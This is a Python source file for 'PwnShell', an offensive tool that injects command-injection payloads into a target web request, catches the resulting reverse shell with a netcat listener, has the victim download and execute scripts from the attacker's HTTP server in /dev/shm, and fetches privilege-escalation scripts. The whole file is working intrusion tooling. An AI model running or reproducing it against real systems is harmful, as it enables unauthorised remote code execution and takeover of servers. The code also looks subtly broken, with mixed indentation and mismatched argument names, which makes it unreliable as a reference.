#!/usr/bin/env python3
# coding=utf-8
import sys
import base64
import netifaces
import os
import argparse
import nclib
from threading import Thread
import ipaddress
import urllib3
import requests
from http.server import HTTPServer, CGIHTTPRequestHandler
import socketserver
import urllib.parse
from payloads import PayLoads
import time
import socket
import burpee
from colors import Colors, ColorsSet
import json

class PwnShell:
    def __init__(self, args):
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        self.ip = ip_address
        self.ip = args.host
        self.port = args.port
        self.domain = args.url
        self.method = args.method
        self.cookie = args.cookies
        self.headers = args.headers
        self.data = args.data
        self.type = args.type
        self.file = args.file
        self.nodejs = args.nodejs
        self.payload_type = args.payload
        self.url = None
        self.iteration = 0
        self.encoded_payload = None
        self.payload = None
        self.connected = False
        check = self.check_connection()
        if not check:
            print('Connection refused')
            exit()
        if not self.file and not self.domain:
            print(colors.get_colored_text(
                "[!]Please use Provide a URL or a REQUEST file[!]\n\n" + "[!]USAGE: " + sys.argv[0] + " -h\n",
                ColorsSet.RED))
            exit()
        ########################################################################
        ###################### Specifying OS ###################################
        if self.type == "linux" or self.type == "l":
            self.shell_linux()
        elif self.type == "windows" or self.type == "w":
            self.shell_windows()
        else:
            print(colors.get_colored_text("[!]Invalid Value -> " + self.type + "\n\n[!]USAGE: " + sys.argv[0] + " -h\n",
                                          ColorsSet.RED))
            exit_gracefully()


    ############################################################################################
    ###################################  SENDING THE PAYLOADS #################################

    def send_payload(self):
        payloads = PayLoads(self.ip, self.port, self.nodejs).payloads()
        print(colors.get_colored_text("[!]STAGE #1 --> [BRUTEFORCE] <--", ColorsSet.ORANGE))
        for payload in payloads:
            if self.connected:
                return
            self.payload = payload
            self.encoded_payload = self.get_url_encoded_payload(payload)
            self.iteration += 1
            print(f'[*]Trying payload [{self.iteration}/{len(payloads)}] : {payload[:80]}...', end='\r',
                  flush=True)
            time.sleep(2)
            if self.is_port_in_use():
                break
            self.send_request(payload)
        exit_gracefully()

    #########################################################################################
    ##############################  NC LISTNER + STAGER ###################################

    def listener(self):  # setting up the nc listener & stablizing the shell then uploading linpeas to /dev/shm
        nc = nclib.Netcat(listen=('', self.port))
        print(colors.get_colored_text("\n\n[!]STAGE #2 --> [INFO] <--", ColorsSet.ORANGE))
        self.connected = True  # To stop the thread
        self.for_listener()
        nc.send_line(b"export TERM=xterm-256color")
        print('[*]Uploading Shell Scripts To [/dev/shm] On Target Machine...')
        send = f'''wget -q -r -P /dev/shm/  http://{self.ip}:9002/scripts/ ; clear'''
        nc.send_line(send.encode("utf-8"))
        send = f'''chmod +x /dev/shm/{self.ip}:9002/scripts/* ; mv /dev/shm/{self.ip}:9002/scripts/* /dev/shm/ ; rm -rf /dev/shm/{self.ip}:9002 2>/dev/null ; clear'''
        nc.send_line(send.encode("utf-8"))
        print('[*]Activating a TTY Shell Using --> [Python3]')
        nc.send_line(b'''python3 -c 'import pty;pty.spawn("/bin/bash")\'''')
        nc.interact()
        nc.close()

    def for_listener(self):
        print("[*]CONNECTION ESTABLISHED!")
        if self.method.lower() == "get":
            print("[+]Vulnerable URL:", self.url)
            print("[+]Payload:", self.payload)
        else:
            if self.payload_type.lower() == "encoded":
                print(f"[+]Payload: {self.encoded_payload}")
            else:
                print(f"[+]Payload: {self.payload}")
        print(f"[+]Number Of Payloads Tested : [{self.iteration}]")
        print(colors.get_colored_text("\n[!]STAGE #3 --> [STABILIZING]", ColorsSet.ORANGE))
        print('[*]Cloning PrivESC Scripts From Their Repositories...')
        os.system(
            'curl -f -s https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -o scripts/linpeas.sh 2>/dev/null ; curl -f -s https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o scripts/LinEnum.sh 2>/dev/null ; curl -f -s https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o scripts/linux-exploit-suggester.sh  2>/dev/null ; curl -f -s https://raw.githubusercontent.com/flast101/docker-privesc/master/docker-privesc.sh -o scripts/docker-privesc.sh 2>/dev/null ; curl -f -s https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py -o scripts/suid3num.py 2>/dev/null')

    ###############################################################################################
    ###################################  Send The Request #########################################

    def send_request(self, payload):
        if self.payload_type.lower() == "encoded":
            self.url = self.domain.replace('PWNME', self.encoded_payload)
        else:
            self.url = self.domain.replace('PWNME', payload)
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                   "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
                   "Upgrade-Insecure-Requests": "1",
                   'Content-Type': 'application/x-www-form-urlencoded'}
        if self.headers:
            headers = self.headers
        if self.cookie:
            cookie = json.loads(self.cookie)
        else:
            cookie = None
        if self.method.lower() == 'post':
            if self.data:
                if self.payload_type.lower() == "encoded":
                    data_parsed = self.data.replace("PWNME", self.encoded_payload)
                else:
                    data_parsed = self.data.replace("PWNME", payload)
            else:
                data_parsed = None
            r = requests.post(self.url, headers=headers, cookies=cookie,
                              verify=False, data=data_parsed)
            time.sleep(2)
        else:
            r = requests.get(self.url, headers=headers, cookies=cookie,
                             verify=False)
            time.sleep(2)

    ########################################################################################
    ###################################  PARSER BURPREQUEST #################################
    def parse_file(self):
        print(colors.get_colored_text("[!]STAGE #1 --> [BRUTEFORCE] <--", ColorsSet.ORANGE))
        payloads = PayLoads(self.ip, self.port, self.nodejs).payloads()
        is_encoded = self.payload_type.lower() == "encoded"
        if self.cookie:
            cookie = json.loads(self.cookie)
        else:
            cookie = None
        for payload in payloads:
            if self.connected:
                return
            self.payload = payload
            self.encoded_payload = self.get_url_encoded_payload(payload)
            self.iteration += 1
            print(f'[*]Trying payload [{self.iteration}/{len(payloads)}] : {payload}', end='\r', flush=True)
            request, post_data = burpee.parse_request(self.file)
            for r in request:
                if "PWNME" in request[r]:
                    if is_encoded:
                        request[r] = request[r].replace("PWNME", self.encoded_payload)  # THE PAYLOAD encoded
                    else:
                        request[r] = request[r].replace("PWNME", payload)  # THE PAYLOAD clear plain
                if r == "Host":
                    self.url = 'http://' + request[r] + burpee.get_method_path(self.file)  # CONCATE WITH PATH
            if is_encoded:
                self.url = self.url.replace("PWNME", self.encoded_payload)
            else:
                self.url = self.url.replace("PWNME", payload)

            if self.method.lower() == "post":
                if post_data:
                    if is_encoded:  # The payload encoded
                        post_data = post_data.replace("PWNME", self.encoded_payload)
                    else:
                        post_data = post_data.replace("PWNME", payload)
                else:
                    post_data = None
                req = requests.post(self.url, headers=request, data=post_data, verify=False, cookies=cookie)
                time.sleep(2)
                if self.is_port_in_use():
                    break

            else:
                req = requests.get(self.url, headers=request, verify=False, cookies=cookie)
                time.sleep(2)
                if self.is_port_in_use():
                    break

    def info(self):
        info = {'[*]LOCAL IP': self.ip, '[*]LOCAL PORT': self.port, '[*]TARGET URL ': self.domain,
                '[*]Method': self.method.upper(), '[*]Post Data': self.data, '[*]OS type ': self.type.upper(),
                '[*]Request File': self.file, '[*]Use NodeJS Payloads': self.nodejs,
                '[*]Payload Type: ': self.payload_type.upper()}
        for key, value in info.items():
            if value:
                print(colors.get_colored_text(f"{key} : ", ColorsSet.ORANGE), end='')
                print(colors.get_colored_text(f"{value}", ColorsSet.SILVER))
        print("\n")

    ####################################################################################
    ###################################  LINUX #########################################

    def shell_linux(self):  # Default option
        self.info()
        self.is_valid()
        self.thread()  # leave it the last one

    #########################################################################################
    ###################################  WINDOWS #########################################

    def shell_windows(self):
        print(colors.get_colored_text("\n[%]NOT YET ADDED :(", ColorsSet.BLUE))
        exit_gracefully()

    ######################################################################################
    ##########################  CHECK IF IP & PORT IS VALID ############################

    def is_valid(self):  # Checking if the ip address is valid
        try:
            ipaddress.ip_address(self.ip)
            if self.port <= 65535:
                return True
            else:
                print("[!]Invalid PORT NUMBER -> %d" % self.port)
                exit_gracefully()
        except ValueError:
            print("\n[!]Invalid IP : %d" % self.ip)
            exit_gracefully()


    #########################################################################################
    ###################################  HTTP SERVER #########################################

    def http_server(self):
        # Make sure the server is created at current directory
        os.chdir('.')
        # Create server object listening the port 9002
        server_object = HTTPServer(server_address=('', 9002), RequestHandlerClass=CGIHTTPRequestHandler)
        # Start the web server
        server_object.serve_forever()

    #########################################################################################
    ###################################  THREADS ############################################

    def thread(self):
        listen = Thread(target=self.listener)
        httpserver = Thread(target=self.http_server)
        if self.file:
            burp = Thread(target=self.parse_file)
            burp.daemon = True
            burp.start()
        else:
            sendpayload = Thread(target=self.send_payload)
            sendpayload.daemon = True
            sendpayload.start()
        listen.daemon = True
        httpserver.daemon = True
        listen.start()
        httpserver.start()
        httpserver.join()
        listen.join()
        if self.file:
            burp.join()
        else:
            sendpayload.join()

    ############################################################################################
    ################################ Check If we got connection ################################
    def is_port_in_use(self):
        output = os.popen('netstat -lant').read()
        lines = output.split('\n')
        for line in lines:
            if str(self.port) in line:
                if line.split()[-1] == 'ESTABLISHED':
                    return True
        return False

    def check_connection(self):
        if self.file:
            return True
        url = self.domain.replace('PWNME', 'ls')
        try:
            req = requests.get(url)
            return True
        except requests.exceptions.ConnectionError:
            return False

    #########################################################################################
    ###################################  ENCODING PAYLOADS #################################

    @staticmethod
    def get_url_encoded_payload(payload):
        encoded_payload = urllib.parse.quote(payload)
        encoded_payload = encoded_payload.replace('/', '%2F')
        return encoded_payload


def exit_gracefully():
    print(colors.get_colored_text("\n\n[%]Good Bye!", ColorsSet.BLUE))
    os._exit(1)


def get_banner():
    banner = ''' 

     $$$$$$$\                           $$$$$$\  $$\                 $$\ $$\ 
     $$  __$$\                         $$  __$$\ $$ |                $$ |$$ |
     $$ |  $$ |$$\  $$\  $$\ $$$$$$$\  $$ /  \__|$$$$$$$\   $$$$$$\  $$ |$$ |
     $$$$$$$  |$$ | $$ | $$ |$$  __$$\ \$$$$$$\  $$  __$$\ $$  __$$\ $$ |$$ |
     $$  ____/ $$ | $$ | $$ |$$ |  $$ | \____$$\ $$ |  $$ |$$$$$$$$ |$$ |$$ |
     $$ |      $$ | $$ | $$ |$$ |  $$ |$$\   $$ |$$ |  $$ |$$   ____|$$ |$$ |
     $$ |      \$$$$$\$$$$  |$$ |  $$ |\$$$$$$  |$$ |  $$ |\$$$$$$$\ $$ |$$ |
     \__|       \_____\____/ \__|  \__| \______/ \__|  \__| \_______|\__|\__| V 1.0
     ########################################################################
     ------------------------------------                                                                                
     | Authors: [AbuQasem] & [AlBalouli] |                                              
     ------------------------------------                               
    \n    '''
    return banner

if __name__ == '__main__':
	try:
		colors = Colors(ColorsSet.WHITE)
		print(colors.get_colored_text(get_banner(), ColorsSet.GREEN))
		parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
		try:
			ip_address = netifaces.ifaddresses('tun0')[2][0]['addr']
			parser.add_argument('-H', '--host', help='LOCAL IP ADDRESS', default=ip_address)
		except:
			ip_address = None
			parser.add_argument('-H', '--host', help='LOCAL IP ADDRESS', required=True)
	    parser.add_argument('-p', '--port', help='LOCAL PORT NUMBER', type=int, default=9001)
	    parser.add_argument("-n", "--nodejs", help='Use Nodejs Payloads', action='store_true')
	    parser.add_argument("-f", "--file", help='Request file')
	    parser.add_argument("-t", "--type", help='Choose OS [windows/linux]', type=str, default='linux')
	    parser.add_argument("-u", "--url", help='Target url [http://localhost:8888/h.php?meow=PWNME]')
	    parser.add_argument("-d", "--data", help='Post data')
	    parser.add_argument("-P", "--payload", help='Payload type [encoded/plain]', default='encoded')
	    parser.add_argument("-c", "--cookie", help='Enter Cookie')
	    parser.add_argument("-k", "--header", help='Provide header')
	    parser.add_argument("-m", "--method", help='Request Method', default='POST')
	    args = parser.parse_args()
	    pwnshell = PwnShell(args)
	    pwnshell.send_payload()
	except KeyboardInterrupt:
		exit_gracefully()
# TODO
# Work on windows
# ADD pentest monkey payload
